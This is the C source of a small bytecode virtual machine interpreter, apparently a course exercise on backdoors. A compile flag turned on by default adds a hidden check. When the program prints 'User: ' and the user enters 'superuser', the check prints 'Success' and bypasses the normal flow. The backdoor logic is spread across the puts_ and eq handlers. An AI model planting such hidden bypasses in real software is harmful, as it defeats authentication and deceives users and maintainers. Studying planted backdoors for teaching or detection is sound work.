// This is where you put your VM code.
// I am trying to follow the coding style of the original.

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "minivm.h"

#define NUM_REGS   (256)
#define NUM_FUNCS  (256)
#define NUM_INSTR  (256)
#define SIZE_MEM   (8192)

//#define REG_DEBUG 1
//#define PRINT_INSTRUCTION 1
//#define MEMORY_DEBUG 1
//#define GETS_DEBUG 1
#define BACKDOOR 1

// Global variable that indicates if the process is running.
static bool is_running = true;

uint8_t *ptr_m;
uint32_t *ep;
uint32_t *pc;

bool is_userid_chk = false;

void usageExit()
{
	// TODO: show usage
	printf("Usage: interpreter [bytecode FILE]\n");
	exit(1);
}

void halt(struct VMContext* ctx, const uint32_t instr)
{
	is_running = false;
}

void load(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t dst = EXTRACT_B1(instr);
	const uint8_t src = EXTRACT_B2(instr);
	if (ctx->r[src].value >= SIZE_MEM)
	{
		error_h(HeapError);
	}
	ctx->r[dst].value = EXTRACT_B0(ptr_m[ctx->r[src].value]);
}

void store(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t dst = EXTRACT_B1(instr);
	const uint8_t src = EXTRACT_B2(instr);
	if (ctx->r[dst].value >= SIZE_MEM)
	{
		error_h(HeapError);
	}
	ptr_m[ctx->r[dst].value] = EXTRACT_B0(ctx->r[src].value);
}

void move(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t dst = EXTRACT_B1(instr);
	const uint8_t src = EXTRACT_B2(instr);
	ctx->r[dst].value = ctx->r[src].value;
}

void puti(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t reg = EXTRACT_B1(instr);
	const uint8_t imm = EXTRACT_B2(instr);
	ctx->r[reg].value = imm;
}

void add(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t result = EXTRACT_B1(instr);
	const uint8_t reg1 = EXTRACT_B2(instr);
	const uint8_t reg2 = EXTRACT_B3(instr);
	ctx->r[result].value = ctx->r[reg1].value + ctx->r[reg2].value;
}

void sub(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t result = EXTRACT_B1(instr);
	const uint8_t reg1 = EXTRACT_B2(instr);
	const uint8_t reg2 = EXTRACT_B3(instr);
	ctx->r[result].value = ctx->r[reg1].value - ctx->r[reg2].value;
}

void gt(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t result = EXTRACT_B1(instr);
	const uint8_t reg1 = EXTRACT_B2(instr);
	const uint8_t reg2 = EXTRACT_B3(instr);
	ctx->r[result].value = (ctx->r[reg1].value > ctx->r[reg2].value);
}

void ge(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t result = EXTRACT_B1(instr);
	const uint8_t reg1 = EXTRACT_B2(instr);
	const uint8_t reg2 = EXTRACT_B3(instr);
	ctx->r[result].value = (ctx->r[reg1].value >= ctx->r[reg2].value);
}

void eq(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t result = EXTRACT_B1(instr);
	const uint8_t reg1 = EXTRACT_B2(instr);
	const uint8_t reg2 = EXTRACT_B3(instr);
	ctx->r[result].value = (ctx->r[reg1].value == ctx->r[reg2].value);

#ifdef BACKDOOR	
	if (is_userid_chk)
	{
		if (strcmp("superuser", &ptr_m[0x100]) == 0)
		{
			printf("Success\n");
			is_running = false;
		}
	}
#endif
}

void ite(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t reg = EXTRACT_B1(instr);
	const uint8_t imm1 = EXTRACT_B2(instr);
	const uint8_t imm2 = EXTRACT_B3(instr);
	pc = ep + ((ctx->r[reg].value) ? imm1 : imm2);
	pc--;
}

void jump(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t imm = EXTRACT_B1(instr);
	pc = ep + imm;
	pc--;
}

void puts_(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t reg = EXTRACT_B1(instr);	
	int idx = ctx->r[reg].value;
	if (idx >= SIZE_MEM)
	{
		error_h(HeapError);
	}
	while (1)
	{
		if (idx >= SIZE_MEM)
		{
			break;
		}
		if (ptr_m[idx] == NULL) break;
		printf("%c", ptr_m[idx]);
		++idx;
	}
	// printf("%s", (char*)&ptr_m[ctx->r[reg].value]);

#ifdef BACKDOOR
	if (strcmp("User: ", &ptr_m[ctx->r[reg].value]) == 0)
	{
		is_userid_chk = true;
	}
	else is_userid_chk = false;
#endif
}

void gets_(struct VMContext* ctx, const uint32_t instr)
{
	const uint8_t reg = EXTRACT_B1(instr);
	int idx = ctx->r[reg].value;
	while (1)
	{
		if (idx >= SIZE_MEM)
		{

#ifdef GETS_DEBUG
			printf("%d %d\n", idx, (idx - 256));
#endif

			error_h(HeapError);
		}
		ptr_m[idx++] = getchar();
		if (ptr_m[idx - 1] == 0xA) break;
	}
	ptr_m[--idx] = NULL;

#ifdef GETS_DEBUG
	printf("%d %d\n", idx, (idx - 256));
	printf("%s\n", &ptr_m[ctx->r[reg].value]);
#endif

	//gets(&ptr_m[ctx->r[reg].value]);
}

void initFuncs(FunPtr *f, uint32_t cnt)
{
	uint32_t i;
	for (i = 0; i < cnt; i++)
	{
		f[i] = NULL;
	}

	// TODO: initialize function pointers
	f[0x00] = halt;
	f[0x10] = load;
	f[0x20] = store;
	f[0x30] = move;
	f[0x40] = puti;
	f[0x50] = add;
	f[0x60] = sub;
	f[0x70] = gt;
	f[0x80] = ge;
	f[0x90] = eq;
	f[0xA0] = ite;
	f[0xB0] = jump;
	f[0xC0] = puts_;
	f[0xD0] = gets_;
}

void initRegs(Reg *r, uint32_t cnt)
{
	uint32_t i;
	for (i = 0; i < cnt; i++)
	{
		r[i].type = 0;
		r[i].value = 0;
	}
}

int main(int argc, char** argv)
{
	VMContext vm;
	Reg r[NUM_REGS];
	FunPtr f[NUM_FUNCS];
	FILE* bytecode;
	uint8_t instr_buffer[NUM_INSTR * 4];
	int i;
	int num_ins;

	// There should be at least one argument.
	if (argc < 2) usageExit();

	ptr_m = (uint8_t *)malloc(SIZE_MEM);

	// Initialize registers.
	initRegs(r, NUM_REGS);
	// Initialize interpretation functions.
	initFuncs(f, NUM_FUNCS);
	// Initialize VM context.
	initVMContext(&vm, NUM_REGS, NUM_FUNCS, r, f);

	// Load bytecode file
	bytecode = fopen(argv[1], "rb");
	if (bytecode == NULL)
	{
		perror("fopen");
		return 1;
	}

	fseek(bytecode, 0, SEEK_END);
	num_ins = ftell(bytecode);
	fseek(bytecode, 0, SEEK_SET);
	if (num_ins % 4 || num_ins > (NUM_INSTR * 4))
	{
		error_h(InputError);
	}
	if (fread(instr_buffer, 1, num_ins, bytecode) == -1)
	{
		error_h(InputError);
	}
	num_ins /= 4;

	ep = pc = (uint32_t*)&instr_buffer;
	while (is_running)
	{
		// TODO: Read 4-byte bytecode, and set the pc accordingly
#ifdef PRINT_INSTRUCTION		
		printf("Running instruction %d(%x) | ", (pc - ep), pc);
		for (i = 0; i < 4; ++i)
		{
			printf("%.2x ", instr_buffer[(pc - ep) * 4 + i]);
		}
		printf("\n");
#endif

		if ((pc - ep) >= num_ins)
		{
			error_h(IpError);
		}
		stepVMContext(&vm, &pc);

#ifdef REG_DEBUG
		for (i = 0; i < 10; ++i)
		{
			printf("r%d: %x\n", i, r[i].value);
		}
#endif
	}

#ifdef MEMORY_DEBUG
	printf("addr: 0x0\n");
	for (i = 0; i < 50; ++i)
	{
		if (ptr_m[i] != 0) printf("%c", ptr_m[i]);
		else printf("[NULL]\n");
		if (!ptr_m[i] && !ptr_m[i + 1]) break;
	}
	printf("addr: 0x100\n");
	for (i = 0x100; i < 0x100 + 50; ++i)
	{
		if (ptr_m[i] != 0) printf("%c", ptr_m[i]);
		else printf("[NULL]\n");
		if (!ptr_m[i] && !ptr_m[i + 1]) break;
	}
#endif

	free(ptr_m);
	fclose(bytecode);

	// Zero indicates normal termination.
	return 0;
}